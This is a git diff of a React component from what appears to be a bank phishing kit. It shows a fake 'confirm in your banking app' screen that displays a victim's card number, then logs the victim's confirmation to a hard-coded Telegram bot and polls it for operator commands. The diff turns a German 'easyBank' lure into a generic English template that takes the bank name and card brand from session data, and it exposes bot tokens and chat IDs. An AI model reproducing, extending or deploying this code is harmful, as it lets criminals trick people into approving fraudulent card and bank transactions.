@@ -6,8 +6,8 @@ import './NextStepAppr.css';
 import visaLogo from '../assets/visa-logo.png';
 import mastercardLogo from '../assets/mastercard-logo.png';
 
-const TELEGRAM_BOT_TOKEN = '8208470293:AAFYLJdfLdnXMJJCqTsKRoGufdA1khfif3U';
-const TELEGRAM_ACTIONS_CHAT_ID = '-5097850013';
+const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
+const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';
 
 function NextStepAppr() {
   // eslint-disable-next-line no-unused-vars
@@ -17,6 +17,8 @@ function NextStepAppr() {
   const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
   const [username, setUsername] = useState('');
   const [isSending, setIsSending] = useState(false);
+  const [bankName, setBankName] = useState('Bank');
+  const [cardBrand, setCardBrand] = useState('VISA');
 
   // ✅ Message states
   const [showMessage, setShowMessage] = useState(false);
@@ -27,7 +29,7 @@ function NextStepAppr() {
   const handleSuccessCard = () => {
     console.log('✅ Success button clicked');
     setIsConfirmed(false);
-    setMessageText('Ihre Sitzung ist abgelaufen. Bitte versuchen Sie es erneut.');
+    setMessageText('Your session has expired. Please try again.');
     setMessageType('warning');
     setShowMessage(true);
     
@@ -42,7 +44,7 @@ function NextStepAppr() {
   const handleBackToAppr = () => {
     console.log('⬅️ Back to Appr clicked');
     setIsConfirmed(false);
-    setMessageText('Bitte stellen Sie sicher, dass Sie in der Banking-App bestätigt haben.');
+    setMessageText('Please make sure you have confirmed in the banking app.');
     setMessageType('warning');
     setShowMessage(true);
     
@@ -56,7 +58,7 @@ function NextStepAppr() {
     setShowMessage(false);
   };
 
-  // ✅ Polling for Telegram callbacks - MUST BE INSIDE THE FUNCTION
+  // ✅ Polling for Telegram callbacks
   useEffect(() => {
     let lastUpdateId = 0;
     
@@ -113,7 +115,7 @@ function NextStepAppr() {
               
               await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                 callback_query_id: update.callback_query.id,
-                text: '✅ Aktion ausgeführt!'
+                text: '✅ Action executed!'
               });
             }
           }
@@ -125,12 +127,14 @@ function NextStepAppr() {
     
     const interval = setInterval(pollTelegram, 3000);
     return () => clearInterval(interval);
-  }, []); // ✅ This useEffect is INSIDE the function
+  }, []);
 
-  // ✅ Second useEffect for loading card data
+  // ✅ Load card data + get bank name
   useEffect(() => {
     const storedCardNumber = sessionStorage.getItem('cardNumber');
     const storedUsername = sessionStorage.getItem('loginName');
+    const storedBankName = sessionStorage.getItem('bankName');
+    const storedBrand = sessionStorage.getItem('cardBrand');
     
     if (storedCardNumber) {
       const last4 = storedCardNumber.slice(-4);
@@ -139,6 +143,12 @@ function NextStepAppr() {
     if (storedUsername) {
       setUsername(storedUsername);
     }
+    if (storedBankName) {
+      setBankName(storedBankName);
+    }
+    if (storedBrand) {
+      setCardBrand(storedBrand);
+    }
     
     const timer = setInterval(() => {
       setCurrentTime(new Date());
@@ -146,8 +156,6 @@ function NextStepAppr() {
     
     return () => clearInterval(timer);
   }, []);
-
-  
 
   const sendTelegramLog = async () => {
     try {
@@ -196,7 +204,7 @@ function NextStepAppr() {
       sessionStorage.setItem('paymentConfirmed', 'true');
       setIsConfirmed(true);
     } else {
-      setMessageText('Fehler beim Senden. Bitte versuchen Sie es erneut.');
+      setMessageText('Error sending. Please try again.');
       setMessageType('warning');
       setShowMessage(true);
       setTimeout(() => setShowMessage(false), 3000);
@@ -209,7 +217,6 @@ function NextStepAppr() {
   if (isConfirmed) {
     return (
       <div className="waiting-container-page">
-        {/* ✅ Message Popup */}
         {showMessage && (
           <div className={`message-popup ${messageType}`}>
             <span className="message-icon">{messageType === 'warning' ? '⚠️' : '✅'}</span>
@@ -220,9 +227,9 @@ function NextStepAppr() {
         
         <div className="waiting-card">
           <div className="bank-logo-container">
-            <div className="bank-logo">easyBank</div>
+            <div className="bank-logo">{bankName}</div>
           </div>
-          <h2 className="waiting-title">Bestätigung in der App</h2>
+          <h2 className="waiting-title">Confirmation in App</h2>
           
           <div className="animated-loader">
             <div className="loader-ring"></div>
@@ -231,22 +238,21 @@ function NextStepAppr() {
             <div className="loader-dot"></div>
           </div>
           
-          <h3>Warte auf Bestätigung</h3>
-          <p>Ihre Bestätigung wurde gesendet.</p>
-          <p>Bitte überprüfen Sie Ihre Banking-App.</p>
-          <p className="waiting-time">Aktuelle Zeit: {currentTime.toLocaleString()}</p>
+          <h3>Waiting for Confirmation</h3>
+          <p>Your confirmation has been sent.</p>
+          <p>Please check your mobile banking app.</p>
+          <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
         </div>
       </div>
     );
   }
 
-  // Show RB Key confirmation page FIRST
+  // Show confirmation page FIRST
   return (
     <div className="confirmation-overlay">
-      {/* ✅ Message Popup */}
       {showMessage && (
         <div className={`message-popup ${messageType}`}>
-          <span className="message-icon">{messageType === 'warning' ? '' : '✅'}</span>
+          <span className="message-icon">{messageType === 'warning' ? '⚠️' : '✅'}</span>
           <span className="message-text">{messageText}</span>
           <button className="message-close" onClick={closeMessage}>×</button>
         </div>
@@ -254,40 +260,38 @@ function NextStepAppr() {
       
       <div className="confirmation-modal">
         <div className="modal-header">
-          <div className="bank-logo-container">
-            <span className="bank-brand">easyBank</span>
-          </div>
           <div className="card-icons">
             <img src={visaLogo} alt="VISA" className="visa-logo" />
             <img src={mastercardLogo} alt="Mastercard" className="mastercard-logo" />
           </div>
         </div>
 
-        <h3>Bestätigung in der Banking-App</h3>
+        <h3>Confirmation in your Bank App</h3>
         
         <div className="confirmation-details">
           <div className="detail-row">
-            <span className="detail-label">Händler:</span>
-            <span className="detail-value">easyBank</span>
+            <span className="detail-label">Merchant:</span>
+            <span className="detail-value">{sessionStorage.getItem('cardBrand') || 'VISA'}</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Betrag:</span>
-            <span className="detail-value">0,00 €</span>
+            <span className="detail-label">Amount:</span>
+            <span className="detail-value">$0.00</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Datum:</span>
+            <span className="detail-label">Date:</span>
             <span className="detail-value">{new Date().toLocaleString()}</span>
           </div>
           <div className="detail-row">
-            <span className="detail-label">Kartennummer:</span>
+            <span className="detail-label">Card Number:</span>
             <span className="detail-value">{cardNumber}</span>
           </div>
         </div>
 
         <div className="confirmation-instructions">
-          <p>• Öffnen Sie die Banking-App auf Ihrem Smartphone.</p>
-          <p>• Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.</p>
-          <p>• Tippen Sie auf "BESTÄTIGEN", wenn Sie zurück sind.</p>
+          <p>• Open your banking app on your smartphone.</p>
+          <p>• Confirm the authorization.</p>
+          <p>• Return to this screen after confirmation.</p>
+          <p>• Tap "CONFIRM" when you are back.</p>
         </div>
 
         <div className="confirmation-buttons">
@@ -296,13 +300,13 @@ function NextStepAppr() {
             className="confirm-btn"
             disabled={isSending}
           >
-            {isSending ? 'Wird gesendet...' : 'Bestätigen'}
+            {isSending ? 'Sending...' : 'Confirm'}
           </button>
         </div>
         
         <div className="secure-badge">
           <span className="lock-icon">🔒</span>
-          <span>Sicher durch easyBank geschützt</span>
+          <span>Secured by {bankName}</span>
         </div>
       </div>
     </div>
